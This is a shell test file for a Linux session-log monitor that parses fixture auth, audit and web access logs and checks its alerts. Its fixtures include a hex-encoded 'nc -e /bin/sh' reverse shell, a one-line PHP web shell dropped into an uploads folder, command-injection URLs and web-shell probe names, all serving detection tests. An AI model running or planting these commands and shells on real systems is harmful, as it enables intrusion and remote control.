#!/bin/sh
# Tests for roles/linux/LX-41-session-log.sh.
# Fixture auth.log and audit.log under a fake root (--root), a stable state
# folder (--state).  Checks: login/sudo/command parsing, hex-arg decoding,
# the admin allowlist keeping our own commands quiet, suspicious commands and
# non-admin users alerting, brute-force detection, incremental re-reads
# (second pass quiet, a new line picked up), and that no secret is written.
. "$(dirname "$0")/helper.sh"
SH=${TEST_SHELL:-sh}
C="$T_ROOT/roles/linux/LX-41-session-log.sh"
export BT_SKIP_VERIFY=1
# shellcheck disable=SC2086
run() { $SH "$C" "$@"; }
O="$T_TMP/out"; R="$T_TMP/root"; ST="$T_TMP/state"
mkdir -p "$O" "$R/var/log/audit" "$R/etc"
AUTH="$R/var/log/auth.log"; AUDIT="$R/var/log/audit/audit.log"

printf 'root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\nbob:x:1001:1001::/home/bob:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\n' >"$R/etc/passwd"
printf 'root:x:0:\nsudo:x:27:alice\n' >"$R/etc/group"

t_start "options"
run --loop 2 >/dev/null 2>&1; t_eq "$?" 2 "--loop under 5 seconds is refused"
run --max-mb 0 >/dev/null 2>&1; t_eq "$?" 2 "--max-mb 0 is refused"
t_has "$(run --help 2>&1)" "--setup-auditd" "help lists --setup-auditd"

# ---- auth log: logins, sudo, failures ---------------------------------------
cat >"$AUTH" <<'EOF'
Nov 15 00:10:01 web01 sshd[111]: Accepted publickey for alice from 10.0.0.5 port 2201 ssh2
Nov 15 00:10:02 web01 sshd[112]: Accepted password for root from 10.9.9.9 port 2202 ssh2
Nov 15 00:10:03 web01 sshd[113]: Accepted password for eve from 10.9.9.9 port 2203 ssh2
Nov 15 00:10:04 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow
Nov 15 00:10:05 web01 sudo:    bob : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i
EOF
t_start "auth log: logins and sudo"
r=$(run --out "$O" --state "$ST" --root "$R" --from-start --no-color 2>&1); t_eq "$?" 0 "exit 0"
t_file "$ST/logins.log" "logins.log written"
t_file "$ST/priv.log" "priv.log written"
t_ok "admin publickey login recorded" grep -q 'LOGIN alice from 10.0.0.5 (publickey)' "$ST/logins.log"
A="$ST/alerts.log"
t_ok "admin login is only LOW" grep -q 'LOW  logins   alice@10.0.0.5' "$A"
t_ok "root password login is HIGH" grep -q 'HIGH logins   root@10.9.9.9 .* root logged in over the network with a PASSWORD' "$A"
t_ok "login by an unknown account is HIGH" grep -q 'HIGH logins   eve@10.9.9.9 .* not in /etc/passwd' "$A"
t_ok "admin sudo of a sensitive command is only LOW" grep -q 'LOW  priv     alice .* sensitive command: /bin/cat /etc/shadow' "$A"
t_ok "non-admin sudo bash -i is HIGH" grep -q 'HIGH priv     bob .* dangerous command: /bin/bash -i' "$A"
t_fail "no shadow hash is ever written" grep -rq 'SECRETHASH\|\$6\$' "$ST"

# ---- brute force ------------------------------------------------------------
cat >"$AUTH" <<'EOF'
Nov 15 00:20:01 web01 sshd[201]: Failed password for root from 10.9.9.9 port 1 ssh2
Nov 15 00:20:02 web01 sshd[202]: Failed password for root from 10.9.9.9 port 2 ssh2
Nov 15 00:20:03 web01 sshd[203]: Failed password for invalid user admin from 10.9.9.9 port 3 ssh2
Nov 15 00:20:04 web01 sshd[204]: Failed password for root from 10.9.9.9 port 4 ssh2
Nov 15 00:20:05 web01 sshd[205]: Failed password for root from 10.9.9.9 port 5 ssh2
Nov 15 00:20:06 web01 sshd[206]: Failed password for root from 10.9.9.9 port 6 ssh2
Nov 15 00:20:07 web01 sshd[207]: Failed password for admin from 10.0.0.9 port 7 ssh2
EOF
t_start "brute force"
r=$(run --out "$O" --state "$T_TMP/statebf" --root "$R" --from-start --no-color 2>&1)
t_ok "a burst of failures from one IP is HIGH" grep -q 'HIGH logins   10.9.9.9 .* 6 failed logins from this address' "$T_TMP/statebf/alerts.log"
t_fail "a single failure from another IP is not flagged as brute force" grep -q '10.0.0.9 .* failed logins' "$T_TMP/statebf/alerts.log"

# ---- auditd execve: commands, hex args, allowlist ---------------------------
cat >"$AUDIT" <<'EOF'
type=SYSCALL msg=audit(1731631000.100:200): arch=c000003e syscall=59 success=yes uid=1000 tty=pts0 comm="ls" exe="/bin/ls" key="bt_cmd"
type=EXECVE msg=audit(1731631000.100:200): argc=2 a0="ls" a1="-la"
type=CWD msg=audit(1731631000.100:200): cwd="/home/alice"
type=SYSCALL msg=audit(1731631000.200:201): arch=c000003e syscall=59 success=yes uid=1001 tty=pts1 comm="bash" exe="/bin/bash" key="bt_cmd"
type=EXECVE msg=audit(1731631000.200:201): argc=2 a0="bash" a1="-i"
type=CWD msg=audit(1731631000.200:201): cwd="/tmp"
type=SYSCALL msg=audit(1731631000.300:202): arch=c000003e syscall=59 success=yes uid=0 tty=pts0 comm="nc" exe="/bin/nc" key="bt_cmd"
type=EXECVE msg=audit(1731631000.300:202): argc=3 a0="nc" a1="-e" a2=2F62696E2F7368
type=CWD msg=audit(1731631000.300:202): cwd="/root"
type=SYSCALL msg=audit(1731631000.400:203): arch=c000003e syscall=59 success=no uid=1001 tty=pts1 comm="id" exe="/usr/bin/id" key="bt_cmd"
type=EXECVE msg=audit(1731631000.400:203): argc=1 a0="id"
EOF
# A fresh state so the command pass starts clean.
ST2="$T_TMP/state2"
t_start "auditd commands and the admin allowlist"
r=$(run --out "$O" --state "$ST2" --root "$R" --from-start --no-color 2>&1)
t_has "$r" "[ok] auditd is logging commands" "detects auditd"
t_ok "admin's ls is logged" grep -q 'alice pts0 /home/alice  ls -la' "$ST2/commands.log"
t_fail "admin's ls does NOT alert" grep -q 'commands alice' "$ST2/alerts.log"
t_ok "non-admin bash -i is HIGH" grep -q 'HIGH commands bob .* dangerous command: bash -i' "$ST2/alerts.log"
t_ok "hex-encoded arg is decoded (nc -e /bin/sh)" grep -q 'nc -e /bin/sh' "$ST2/commands.log"
t_ok "nc -e is HIGH even as root" grep -q 'HIGH commands root .* nc -e /bin/sh' "$ST2/alerts.log"
t_fail "a failed execve is skipped" grep -q ' id$' "$ST2/commands.log"

t_start "--alert-own and --all-commands make admin commands show"
ST3="$T_TMP/state3"
r=$(run --out "$O" --state "$ST3" --root "$R" --from-start --no-color --all-commands 2>&1)
t_ok "with --all-commands the admin ls is a LOW alert" grep -q 'LOW  commands alice .* command: ls -la' "$ST3/alerts.log"

# ---- incremental re-read ----------------------------------------------------
t_start "incremental re-read"
ST4="$T_TMP/state4"
run --out "$O" --state "$ST4" --root "$R" --no-color >/dev/null 2>&1   # pass 1: from now, nothing new
r=$(run --out "$O" --state "$ST4" --root "$R" --no-color 2>&1)
t_has "$r" "0 login event(s), 0 command(s)" "second pass with no new lines is quiet"
printf 'type=SYSCALL msg=audit(1731631009.0:209): arch=c000003e syscall=59 success=yes uid=1001 tty=pts1 comm="wget" exe="/usr/bin/wget" key="bt_cmd"\ntype=EXECVE msg=audit(1731631009.0:209): argc=2 a0="wget" a1="http://10.9.9.9/x"\n' >>"$AUDIT"
r=$(run --out "$O" --state "$ST4" --root "$R" --no-color 2>&1)
t_has "$r" "1 command(s)" "a newly appended command is picked up"
t_ok "non-admin wget is flagged" grep -q 'commands bob .* wget' "$ST4/alerts.log"

# ---- no auditd --------------------------------------------------------------
t_start "no auditd: still logs sudo, points at --setup-auditd"
rm -f "$AUDIT"
r=$(run --out "$O" --state "$T_TMP/state5" --root "$R" --from-start --no-color 2>&1)
t_has "$r" "auditd is not logging commands" "says auditd is off"
t_has "$r" "--setup-auditd" "and how to turn it on"

# ---- review additions ---------------------------------------------------------
t_start "who really ran it (auid), daemons, and this script's own helpers"
SR="$T_TMP/statereal"; mkdir -p "$SR"
NONE="(none)"   # what auditd writes for "no terminal"
printf 'postfix:x:105:110::/var/spool/postfix:/usr/sbin/nologin\n' >>"$R/etc/passwd"
cat >"$AUDIT" <<EOF2
type=SYSCALL msg=audit(1731631200.1:500): arch=c000003e syscall=59 success=yes exit=0 ppid=10 pid=11 auid=1001 uid=0 gid=0 euid=0 tty=pts1 ses=3 comm="cat" exe="/usr/bin/cat" key="bt_cmd"
type=EXECVE msg=audit(1731631200.1:500): argc=2 a0="cat" a1="notes.txt"
type=CWD msg=audit(1731631200.1:500): cwd="/root"
type=SYSCALL msg=audit(1731631200.2:501): arch=c000003e syscall=59 success=yes exit=0 ppid=1 pid=12 auid=4294967295 uid=105 gid=110 tty=${NONE} ses=4294967295 comm="pickup" exe="/usr/lib/postfix/pickup" key="bt_cmd"
type=EXECVE msg=audit(1731631200.2:501): argc=1 a0="pickup"
type=CWD msg=audit(1731631200.2:501): cwd="/var/spool/postfix"
type=SYSCALL msg=audit(1731631200.3:502): arch=c000003e syscall=59 success=yes exit=0 ppid=20 pid=21 auid=1000 uid=0 gid=0 tty=pts0 ses=1 comm="awk" exe="/usr/bin/awk" key="bt_cmd"
type=EXECVE msg=audit(1731631200.3:502): argc=2 a0="awk" a1="-f"
type=CWD msg=audit(1731631200.3:502): cwd="$SR"
EOF2
r=$(run --out "$O" --state "$SR" --root "$R" --from-start --no-color 2>&1)
t_ok "root command from a non-admin login is attributed to that login" grep -q 'MED  commands bob as root .* command by a non-admin account: cat notes.txt' "$SR/alerts.log"
t_ok "commands.log shows the login and who it ran as" grep -q 'bob(as root) pts1 /root  cat notes.txt' "$SR/commands.log"
t_ok "the event time comes from the audit record" grep -q '^2024-11-15T00:40:00Z bob' "$SR/commands.log"
t_ok "a daemon account with no terminal is logged" grep -q 'postfix .* pickup' "$SR/commands.log"
t_fail "but not alerted" grep -q 'postfix' "$SR/alerts.log"
t_fail "commands run from the state folder (this script) are left out" grep -q 'awk -f' "$SR/commands.log"

t_start "repeats are held back"
cat >>"$AUDIT" <<'EOF2'
type=SYSCALL msg=audit(1731631300.1:510): arch=c000003e syscall=59 success=yes exit=0 ppid=10 pid=31 auid=1001 uid=0 gid=0 tty=pts1 comm="cat" exe="/usr/bin/cat" key="bt_cmd"
type=EXECVE msg=audit(1731631300.1:510): argc=2 a0="cat" a1="notes.txt"
type=CWD msg=audit(1731631300.1:510): cwd="/root"
EOF2
r=$(run --out "$O" --state "$SR" --root "$R" --no-color 2>&1)
t_has "$r" "1 repeat(s) not shown" "the same alert again is counted, not shown"
t_eq "$(grep -c 'cat notes.txt' "$SR/alerts.log")" 1 "and not written to alerts.log twice"
t_eq "$(grep -c 'cat notes.txt' "$SR/commands.log")" 2 "but the command is logged both times"
cat >>"$AUDIT" <<'EOF2'
type=SYSCALL msg=audit(1731631400.1:520): arch=c000003e syscall=59 success=yes exit=0 ppid=10 pid=41 auid=1001 uid=0 gid=0 tty=pts1 comm="cat" exe="/usr/bin/cat" key="bt_cmd"
type=EXECVE msg=audit(1731631400.1:520): argc=2 a0="cat" a1="notes.txt"
type=CWD msg=audit(1731631400.1:520): cwd="/root"
EOF2
run --out "$O" --state "$SR" --root "$R" --no-color --repeat-after 0 >/dev/null 2>&1
t_eq "$(grep -c 'cat notes.txt' "$SR/alerts.log")" 2 "--repeat-after 0 shows every repeat"

t_start "auth log: denied sudo, account changes, a guessed password"
SA="$T_TMP/stateauth"
cat >"$AUTH" <<'EOF2'
Nov 15 01:00:01 web01 sudo:      bob : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/ls /root
Nov 15 01:00:02 web01 useradd[900]: new user: name=evil, UID=0, GID=0, home=/home/evil, shell=/bin/bash, from=/dev/pts/1
Nov 15 01:00:03 web01 usermod[901]: add 'bob' to group 'sudo'
Nov 15 01:00:04 web01 passwd[902]: pam_unix(passwd:chauthtok): password changed for alice
Nov 15 01:00:05 web01 sudo[903]:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/id
Nov 15 01:00:06 web01 su: (to root) bob on pts/1
Nov 15 01:01:01 web01 sshd[911]: Failed password for alice from 10.7.7.7 port 1 ssh2
Nov 15 01:01:02 web01 sshd[912]: Failed password for alice from 10.7.7.7 port 2 ssh2
Nov 15 01:01:03 web01 sshd[913]: Failed password for alice from 10.7.7.7 port 3 ssh2
Nov 15 01:01:04 web01 sshd[914]: Failed password for alice from 10.7.7.7 port 4 ssh2
Nov 15 01:01:05 web01 sshd[915]: Failed password for alice from 10.7.7.7 port 5 ssh2
Nov 15 01:01:06 web01 sshd[916]: Failed password for alice from 10.7.7.7 port 6 ssh2
Nov 15 01:01:07 web01 sshd[917]: Accepted password for alice from 10.7.7.7 port 7 ssh2
EOF2
r=$(run --out "$O" --state "$SA" --root "$R" --from-start --no-color 2>&1)
A3="$SA/alerts.log"
t_ok "sudo by an account not in sudoers is HIGH, not logged as run" grep -q 'HIGH priv     bob .* tried sudo but is not allowed: /bin/ls /root' "$A3"
t_ok "a new UID 0 account is HIGH" grep -q 'HIGH accounts evil .* new account created with UID 0' "$A3"
t_ok "added to the sudo group is HIGH" grep -q 'HIGH accounts bob .* added to group sudo' "$A3"
t_ok "a password change is flagged" grep -q 'MED  accounts alice .* password changed' "$A3"
t_ok "sudo with a pid in the log line is read" grep -q 'SUDO alice: /usr/bin/id' "$SA/priv.log"
t_ok "su to root by a non-admin is HIGH" grep -q 'HIGH priv     bob .* su to root by a non-admin account' "$A3"
t_ok "a login that works after many failures is HIGH" grep -q 'HIGH logins   alice@10.7.7.7 .* login SUCCEEDED after 6 failed logins' "$A3"
t_ok "the log keeps the event's own time" grep -q '^Nov 15 01:01:07 LOGIN alice from 10.7.7.7 (password)' "$SA/logins.log"
t_has "$r" "HIGH" "the pass line counts the alerts" && t_hasnt "$r" "alerts: 0 HIGH" "including the brute force"

t_start "slow brute force adds up across passes"
SB="$T_TMP/stateslow"; : >"$AUTH"
run --out "$O" --state "$SB" --root "$R" --from-start --no-color >/dev/null 2>&1
_i=0
while [ "$_i" -lt 5 ]; do
    _i=$((_i + 1))
    for _j in 1 2 3 4; do printf 'Nov 15 02:0%s:0%s web01 sshd[1]: Failed password for root from 10.6.6.6 port 1 ssh2\n' "$_i" "$_j" >>"$AUTH"; done
    run --out "$O" --state "$SB" --root "$R" --no-color >/dev/null 2>&1
done
t_ok "20 failures over several passes is HIGH" grep -q 'HIGH logins   10.6.6.6 .* 20 failed logins so far from this address (slow brute force)' "$SB/alerts.log"

t_start "an ongoing brute force is one alert, not one per check"
SC="$T_TMP/statebf2"; : >"$AUTH"
run --out "$O" --state "$SC" --root "$R" --from-start --no-color >/dev/null 2>&1
for _n in 6 7; do
    _j=0; while [ "$_j" -lt "$_n" ]; do _j=$((_j + 1)); printf 'Nov 15 02:30:0%s web01 sshd[1]: Failed password for root from 10.3.3.3 port 1 ssh2\n' "$_j" >>"$AUTH"; done
    run --out "$O" --state "$SC" --root "$R" --no-color >/dev/null 2>&1
done
t_eq "$(grep -c '10.3.3.3 .* failed logins from this address' "$SC/alerts.log")" 1 "the second burst from the same address is held back"

t_start "web: refused probes are counted, encoded requests are decoded"
SW="$T_TMP/statew3"; mkdir -p "$R/var/log/apache2"
cat >"$R/var/log/apache2/access.log" <<'EOF2'
10.5.5.5 - - [15/Nov/2026:03:00:01 -0500] "GET /c99.php HTTP/1.1" 404 10 "-" "scan"
10.5.5.5 - - [15/Nov/2026:03:00:02 -0500] "GET /shell.php HTTP/1.1" 404 10 "-" "scan"
10.5.5.5 - - [15/Nov/2026:03:00:03 -0500] "GET /r57.php HTTP/1.1" 403 10 "-" "scan"
10.4.4.4 - - [15/Nov/2026:03:00:04 -0500] "GET /view.php?f=x%3Bid HTTP/1.1" 200 10 "-" "curl"
EOF2
r=$(run --out "$O" --state "$SW" --root "$R" --from-start --no-color 2>&1)
t_ok "three refused probes from one address make one alert" grep -q 'MED  web      10.5.5.5 .* 3 request(s) probing for web shells or injection, all refused' "$SW/alerts.log"
t_eq "$(grep -c '10.5.5.5' "$SW/alerts.log")" 1 "not three"
t_ok "a URL-encoded injection that was answered is HIGH" grep -q 'HIGH web      10.4.4.4 GET /view.php .* command-injection' "$SW/alerts.log"
t_ok "web.log keeps the request's own time" grep -q '^15/Nov/2026:03:00:04 -0500 10.4.4.4' "$SW/web.log"


# ---- web shell: web-user commands, process origin, access log ---------------
mkdir -p "$R/var/www/html/uploads" "$R/var/log/apache2"
t_start "web shell: command by the web-server user, and process origin"
cat >"$AUDIT" <<'EOF2'
type=SYSCALL msg=audit(1731631100.1:400): arch=c000003e syscall=59 success=yes uid=33 tty=pts9 comm="id" exe="/usr/bin/id" key="bt_cmd"
type=EXECVE msg=audit(1731631100.1:400): argc=1 a0="id"
type=CWD msg=audit(1731631100.1:400): cwd="/var/www/html"
type=SYSCALL msg=audit(1731631100.2:401): arch=c000003e syscall=59 success=yes uid=1000 tty=pts0 comm="x" exe="/tmp/.x" key="bt_cmd"
type=EXECVE msg=audit(1731631100.2:401): argc=1 a0="/tmp/.x"
type=CWD msg=audit(1731631100.2:401): cwd="/tmp"
EOF2
STW="$T_TMP/stateweb"
r=$(run --out "$O" --state "$STW" --root "$R" --from-start --no-color 2>&1)
t_ok "a command by the web-server user is HIGH (web shell)" grep -q 'HIGH commands www-data .* web server account ran a command (web shell?): id' "$STW/alerts.log"
t_ok "a process running from /tmp is HIGH" grep -q 'HIGH commands alice .* process running from program /tmp/.x' "$STW/alerts.log"

t_start "web shell: the access log"
cat >"$R/var/log/apache2/access.log" <<'EOF2'
10.0.0.5 - - [15/Nov/2026:00:10:01 -0500] "GET /index.html HTTP/1.1" 200 120 "-" "Mozilla"
10.9.9.9 - - [15/Nov/2026:00:10:02 -0500] "GET /app.php?cmd=id;whoami HTTP/1.1" 200 12 "-" "curl/8"
10.9.9.9 - - [15/Nov/2026:00:10:03 -0500] "POST /wso.php HTTP/1.1" 200 44 "-" "curl/8"
10.9.9.9 - - [15/Nov/2026:00:10:04 -0500] "POST /uploads/evil.php HTTP/1.1" 200 9 "-" "curl/8"
EOF2
STW2="$T_TMP/stateweb2"
mkdir -p "$STW2"; : >"$STW2/.started"; sleep 1
printf '<?php system($_GET[c]); ?>\n' >"$R/var/www/html/uploads/evil.php"   # dropped after .started
r=$(run --out "$O" --state "$STW2" --root "$R" --from-start --no-color 2>&1)
t_has "$r" "watching web access log(s)" "finds the access log"
t_file "$STW2/web.log" "web.log written"
A2="$STW2/alerts.log"
t_ok "a command-injection request is HIGH" grep -q 'HIGH web .*10.9.9.9 GET /app.php .* command-injection' "$A2"
t_ok "a known web-shell filename is HIGH" grep -q 'HIGH web .* request to a known web-shell filename (wso.php)' "$A2"
t_ok "a request to a newly dropped script is HIGH" grep -q 'HIGH web .*dropped web shell.*uploads/evil.php' "$A2"
t_fail "a plain request is not alerted" grep -q 'web .* /index.html' "$A2"
t_ok "every request is still logged" grep -q 'GET /index.html' "$STW2/web.log"

t_done
